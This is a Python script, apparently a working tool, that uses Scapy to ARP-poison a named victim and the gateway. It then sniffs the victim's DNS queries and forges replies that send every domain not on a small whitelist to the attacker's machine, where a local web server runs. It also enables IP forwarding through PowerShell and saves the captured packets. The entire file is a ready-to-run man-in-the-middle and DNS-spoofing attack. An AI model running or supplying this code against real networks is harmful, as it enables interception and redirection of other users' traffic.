from multiprocessing import Process, Event

from scapy.all import srp, conf, send, sniff, wrpcap, get_if_addr, sendp
from scapy.layers.l2 import ARP, Ether
from scapy.layers.inet import IP, UDP
from scapy.layers.dns import DNS, DNSRR

import subprocess
import sys
import time
import os.path
import logging

from my_server import run_server

event = Event()

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

default_if = "Беспроводная сеть"

whitelist = ["google.com", "www.google.com"]

script_dir = "script"


def get_mac(target_ip):
	packet = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op="who-has", pdst=target_ip)
	resp, _ = srp(packet, timeout=2, retry=10, verbose=False)
	for _, r in resp:
		return r[ARP].hwsrc
	return None


class Arper:
	def __init__(self, victim, gateway, interface):
		self.victim = victim
		self.victim_mac = get_mac(victim)
		self.gateway = gateway
		self.gateway_mac = get_mac(gateway)

		self.interface = interface

		try:
			self.me = get_if_addr(interface)
		except ValueError as e:
			print(e)
			exit(0)

		conf.iface = interface
		conf.verb = 0

	def handle(self, pkt):
		if pkt[DNS].qd.qname.decode("utf-8")[:-1] in whitelist:
			return

		eth = Ether(src=pkt[Ether].dst, dst=pkt[Ether].src)

		ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)

		udp = UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)

		dns = DNS(
			id=pkt[DNS].id,
			qd=pkt[DNS].qd,
			aa=1,
			rd=0,
			qr=1,
			qdcount=1,
			ancount=1,
			nscount=0,
			arcount=0,
			ar=DNSRR(
				rrname=pkt[DNS].qd.qname,
				type='A',
				ttl=600,
				rdata=self.me)
		)

		response_packet = eth / ip / udp / dns

		sendp(response_packet, iface=self.interface, verbose=False)

	def poison(self, e):
		poison_victim_packet = ARP(op=2, psrc=self.gateway, pdst=self.victim, hwdst=self.victim_mac)
		poison_victim = Ether(dst=self.victim_mac) / poison_victim_packet
		poison_gateway_packet = ARP(op=2, psrc=self.victim, pdst=self.gateway, hwdst=self.gateway_mac)
		poison_gateway = Ether(dst=self.gateway_mac) / poison_gateway_packet

		print("Beginning the ARP poison. [CTRL-C to stop]")
		while True:
			try:
				send(poison_victim, verbose=False)
				send(poison_gateway, verbose=False)
				time.sleep(2)
			except KeyboardInterrupt:
				print("SIGINT received")
				break

		e.set()
		self.restore()
		sys.exit(0)

	def sniff(self, e):
		time.sleep(5)

		print(f"Sniffing packets")
		bpf_filter = "src host %s and udp and dst port 53" % self.victim
		packets = sniff(
			prn=self.handle,
			filter=bpf_filter,
			stop_filter=lambda _: e.is_set(),
			iface=self.interface
		)

		wrpcap("arper.pcap", packets)
		print("Saved to arper.pcap")
		sys.exit(0)

	def restore(self):
		print("Restoring ARP tables...")

		for i in range(10):
			send(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(
				op=2,
				psrc=self.gateway,
				hwsrc=self.gateway_mac,
				pdst=self.victim,
				hwdst="ff:ff:ff:ff:ff:ff"),
				verbose=False)
			send(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(
				op=2,
				psrc=self.victim,
				hwsrc=self.victim_mac,
				pdst=self.gateway,
				hwdst="ff:ff:ff:ff:ff:ff"),
				verbose=False)
			time.sleep(2)

		print("ARP tables restored!")


if __name__ == "__main__":
	if len(sys.argv) < 3:
		print(f"Usage: python3 {os.path.basename(__file__)} victim_ip gateway_ip [interface_name]")
		exit(0)

	if len(sys.argv) > 3:
		default_if = sys.argv[3]

	p = subprocess.Popen(
		['powershell.exe', f'.\\{script_dir}\\Enable-Forwarding.ps1', '-InterfaceName', f'"{default_if}"'],
		stderr=subprocess.STDOUT, stdout=subprocess.PIPE
	)
	p.wait()
	if b"PermissionDenied" in p.communicate()[0]:
		print("Failed to enable forwarding on network interface")
		print("Rerun with administrator privileges!")
		exit(0)

	myarp = Arper(sys.argv[1], sys.argv[2], default_if)

	poison_process = Process(target=myarp.poison, args=(event,))
	poison_process.start()

	sniff_process = Process(target=myarp.sniff, args=(event,))
	sniff_process.start()

	server_process = Process(target=run_server)
	server_process.start()

	print("Web server started")

	try:
		event.wait()
	except KeyboardInterrupt:
		pass

	sniff_process.join()
	poison_process.join()
	server_process.terminate()

	print("Program finished")
